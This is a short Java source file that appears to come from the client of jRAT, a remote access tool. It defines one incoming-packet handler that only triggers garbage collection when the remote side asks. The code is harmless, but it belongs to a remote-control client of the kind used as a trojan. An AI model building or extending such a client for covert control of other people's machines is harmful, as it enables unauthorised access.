package jrat.client.packets.incoming;

import jrat.client.Connection;

public class Packet74GarbageCollect implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		System.gc();
	}

}
